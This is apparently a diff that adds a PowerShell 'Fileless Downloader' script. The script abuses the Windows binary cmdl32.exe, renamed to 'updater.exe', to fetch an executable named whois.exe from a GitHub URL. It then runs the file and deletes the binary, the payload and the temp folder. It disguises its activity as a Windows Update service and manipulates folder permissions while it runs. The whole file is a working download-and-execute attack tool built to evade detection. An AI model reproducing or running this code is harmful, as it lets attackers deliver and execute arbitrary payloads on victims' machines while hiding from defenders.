@@ -1,0 +1,85 @@
+Write-Host "[-] Fileless Downloader - liquidsky ^_~"
+# Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
+
+# Create a temp directory to work in
+$tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
+New-Item -Path $tempDir -ItemType Directory -Force
+Set-Location -Path $tempDir
+Write-Host "[*] Working directory changed to $tempDir"
+
+# Deny delete permissions for the current user to prevent accidental deletion
+Write-Host "[*] Denying delete permissions for current user"
+icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
+
+# Copy cmdl32.exe to temp and rename it
+$sourceCmdl32 = "C:\Windows\System32\cmdl32.exe"
+$renamedCmdl32 = Join-Path -Path $tempDir -ChildPath "updater.exe"
+Copy-Item -Path $sourceCmdl32 -Destination $renamedCmdl32 -Force
+Write-Host "[*] Copied and renamed cmdl32.exe to $renamedCmdl32"
+
+# Embed settings file content directly in memory
+$settingsContent = @"
+[Connection Manager]
+CMSFile=settings.txt
+ServiceName=WindowsUpdate
+TunnelFile=settings.txt
+[Settings]
+UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
+"@
+
+# Execute the renamed cmdl32.exe with arguments, feeding settings from memory
+Write-Host "[*] Performing download with memory-based settings"
+$cmdArguments = "/vpn /lan `"$settingsContent`""
+try {
+    Start-Process -FilePath $renamedCmdl32 -ArgumentList $cmdArguments -NoNewWindow -Wait
+    Write-Host "[*] Download complete using updater.exe."
+} catch {
+    Write-Host "[!] Download failed: $($_.Exception.Message)"
+    # Revert permissions before exiting
+    icacls $tempDir /remove:d "$env:USERNAME"
+    Exit
+}
+
+# Revert permissions after the download is complete
+Write-Host "[*] Reverting permissions on temp directory"
+icacls $tempDir /remove:d "$env:USERNAME"
+
+# Locate the downloaded file (assuming it's named after a default pattern like "VPN*.tmp")
+Write-Host "[*] Renaming downloaded file for execution"
+$downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
+if ($downloadedFile) {
+    Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
+
+    # Construct the target path for renaming
+    $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
+    Write-Host "[*] Target path for rename: $targetPath"
+
+    # Try renaming or moving the file
+    try {
+        Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
+        Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
+    } catch {
+        Write-Host "[!] Failed to rename file: $($_.Exception.Message)"
+        Exit
+    }
+} else {
+    Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
+    Exit
+}
+
+# Execute the downloaded file
+Write-Host "[*] Executing the downloaded file"
+if (Test-Path "$targetPath") {
+    Start-Process -FilePath "$targetPath" -NoNewWindow -Wait
+    Write-Host "[*] Execution of whois.exe complete."
+} else {
+    Write-Host "[!] whois.exe not found after renaming. Exiting script."
+    Exit
+}
+
+# Clean up: Remove the copied cmdl32, the downloaded file, and the temp directory
+Write-Host "[*] Cleaning up temporary files"
+Remove-Item -Path "$targetPath" -Force
+Remove-Item -Path "$renamedCmdl32" -Force
+Remove-Item -Path $tempDir -Recurse -Force
+Write-Host "[*] Script complete."
